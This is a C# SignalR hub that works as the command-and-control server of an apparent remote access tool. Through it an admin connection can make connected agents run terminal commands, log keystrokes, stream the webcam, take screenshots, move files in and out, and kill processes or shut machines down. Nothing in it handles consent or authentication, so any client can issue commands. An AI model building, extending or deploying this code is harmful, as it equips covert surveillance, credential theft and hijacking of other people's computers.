using Microsoft.AspNetCore.SignalR;
using System.Collections.Concurrent;

namespace WebApp.Hubs
{
    public class AgentInfo
    {
        public string MachineName { get; set; } = "";
        public DateTime LastHeartbeat { get; set; }
        public bool IsKeylogging { get; set; } = false;
        public bool IsWebcamStreaming { get; set; } = false;
        // Add more as needed: IsTerminalRunning, etc.
    }

    public class RemoteControlHub : Hub
    {
        // Thread-safe dictionary: ConnectionId -> AgentInfo
        public static readonly ConcurrentDictionary<string, AgentInfo> ConnectedAgents = new();

        public override Task OnConnectedAsync()
        {
            return base.OnConnectedAsync();
        }

        public override Task OnDisconnectedAsync(Exception? exception)
        {
            if (ConnectedAgents.TryRemove(Context.ConnectionId, out var info))
            {
                // Reset statuses on disconnect
                info.IsKeylogging = false;
                info.IsWebcamStreaming = false;
                // Add more resets as needed
                Clients.All.SendAsync("AgentDisconnected", Context.ConnectionId, info.MachineName);
            }
            return base.OnDisconnectedAsync(exception);
        }

        // Agent calls this to register
        public async Task RegisterAgent(string machineName)
        {
            ConnectedAgents.AddOrUpdate(Context.ConnectionId, 
                new AgentInfo { MachineName = machineName, LastHeartbeat = DateTime.UtcNow },
                (key, oldValue) => new AgentInfo { MachineName = machineName, LastHeartbeat = DateTime.UtcNow });
            
            await Clients.All.SendAsync("AgentConnected", Context.ConnectionId, machineName);
        }

        // Agent calls this every 10s
        public async Task Heartbeat(string machineName)
        {
            if (ConnectedAgents.TryGetValue(Context.ConnectionId, out var info))
            {
                info.LastHeartbeat = DateTime.UtcNow;
            }
            else
            {
                await RegisterAgent(machineName);
            }
            await Clients.All.SendAsync("ReceiveAgentHeartbeat", Context.ConnectionId);
        }

        // Admin calls this on load to get currently connected agents
        public async Task GetConnectedAgents()
        {
            var threshold = DateTime.UtcNow.AddSeconds(-65);
            var agentsList = ConnectedAgents
                .Where(x => x.Value.LastHeartbeat >= threshold)
                .Select(x => new { 
                    id = x.Key, 
                    name = x.Value.MachineName,
                    status = GetAgentStatus(x.Value)
                })
                .ToList();
            var json = System.Text.Json.JsonSerializer.Serialize(agentsList);
            await Clients.Caller.SendAsync("ReceiveConnectedAgents", json);
        }

        private string GetAgentStatus(AgentInfo info)
        {
            var statuses = new List<string>();
            if (info.IsKeylogging) statuses.Add("Keylogging");
            if (info.IsWebcamStreaming) statuses.Add("Webcam");
            // Add more: if (info.IsTerminalRunning) statuses.Add("Terminal");
            return statuses.Any() ? string.Join(", ", statuses) : "Connected";
        }

        private async Task BroadcastAgentStatusUpdate(string agentId)
        {
            if (ConnectedAgents.TryGetValue(agentId, out var info))
            {
                var status = GetAgentStatus(info);
                await Clients.All.SendAsync("AgentStatusUpdate", agentId, status);
            }
        }

        // Admin calls this to request processes from an Agent
        public async Task RequestProcesses(string targetConnectionId)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("GetProcessesCommand", adminId);
        }

        // Agent responds with the process list back to Hub
        // DTO object: List<dynamic> or JSON string
        public async Task SendProcessesResult(string adminConnectionId, string processesJson)
        {
            // Send directly to the requesting admin instead of broadcasting
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveProcesses", Context.ConnectionId, processesJson);
            }
        }

        // Admin calls this to Kill a process on a specific Agent
        public async Task KillProcess(string targetConnectionId, int processId)
        {
            await Clients.Client(targetConnectionId).SendAsync("KillProcessCommand", processId);
        }

        // --- NEW: Applications Management ---
        public async Task RequestApplications(string targetConnectionId)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("GetApplicationsCommand", adminId);
        }

        public async Task SendApplicationsResult(string adminConnectionId, string appsJson)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveApplications", Context.ConnectionId, appsJson);
            }
        }

        public async Task StartApplication(string targetConnectionId, string appPath)
        {
            await Clients.Client(targetConnectionId).SendAsync("StartAppCommand", appPath);
        }

        // --- NEW: Power Management ---
        public async Task ShutdownDevice(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("ShutdownCommand");
        }

        public async Task RestartDevice(string targetConnectionId)
        {
            await Clients.Client(targetConnectionId).SendAsync("RestartCommand");
        }

        // --- NEW: Screen Capture ---
        public async Task RequestScreenshot(string targetConnectionId)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("TakeScreenshotCommand", adminId);
        }

        // Agent responds with the Base64 image
        public async Task SendScreenshotResult(string adminConnectionId, string base64Image)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveScreenshot", Context.ConnectionId, base64Image);
            }
        }

        // --- NEW: File Manager ---
        public async Task RequestDirectoryContents(string targetConnectionId, string path)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("GetDirectoryContentsCommand", adminId, path);
        }

        public async Task SendDirectoryContentsResult(string adminConnectionId, string path, string json)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveDirectoryContents", Context.ConnectionId, path, json);
            }
        }

        public async Task RequestFileDownload(string targetConnectionId, string filePath)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("DownloadFileCommand", adminId, filePath);
        }

        public async Task SendFileResult(string adminConnectionId, string fileName, string base64Data)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveFile", Context.ConnectionId, fileName, base64Data);
            }
        }

        public async Task UploadFileToAgent(string targetConnectionId, string dirPath, string fileName, string base64Data)
        {
            await Clients.Client(targetConnectionId).SendAsync("ReceiveFileUploadCommand", dirPath, fileName, base64Data);
        }

        // --- NEW: Webcam Stream ---
        public async Task RequestWebcams(string targetConnectionId)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("GetWebcamsCommand", adminId);
        }

        public async Task SendWebcamsResult(string adminConnectionId, string webcamsJson)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveWebcams", Context.ConnectionId, webcamsJson);
            }
        }

        public async Task RequestStartWebcam(string targetConnectionId, string cameraMoniker = "")
        {
            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
            {
                info.IsWebcamStreaming = true;
                await BroadcastAgentStatusUpdate(targetConnectionId);
            }
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("StartWebcamCommand", adminId, cameraMoniker ?? "");
        }

        public async Task RequestStopWebcam(string targetConnectionId)
        {
            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
            {
                info.IsWebcamStreaming = false;
                await BroadcastAgentStatusUpdate(targetConnectionId);
            }
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("StopWebcamCommand", adminId);
        }

        public async Task SendWebcamFrame(string adminConnectionId, string base64Image)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveWebcamFrame", Context.ConnectionId, base64Image);
            }
        }

        // --- NEW: Keylogger ---
        public async Task RequestStartKeylogger(string targetConnectionId)
        {
            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
            {
                info.IsKeylogging = true;
                await BroadcastAgentStatusUpdate(targetConnectionId);
            }
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("StartKeyloggerCommand", adminId);
        }

        public async Task RequestStopKeylogger(string targetConnectionId)
        {
            if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
            {
                info.IsKeylogging = false;
                await BroadcastAgentStatusUpdate(targetConnectionId);
            }
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("StopKeyloggerCommand", adminId);
        }

        public async Task SendKeylogData(string adminConnectionId, string keys)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveKeylog", Context.ConnectionId, keys);
            }
        }

        // --- NEW: Terminal ---
        public async Task RequestExecuteCommand(string targetConnectionId, string command)
        {
            var adminId = Context.ConnectionId;
            await Clients.Client(targetConnectionId).SendAsync("ExecuteTerminalCommand", adminId, command);
        }

        public async Task SendTerminalOutput(string adminConnectionId, string output)
        {
            if (!string.IsNullOrEmpty(adminConnectionId))
            {
                await Clients.Client(adminConnectionId).SendAsync("ReceiveTerminalOutput", Context.ConnectionId, output);
            }
        }
    }
}
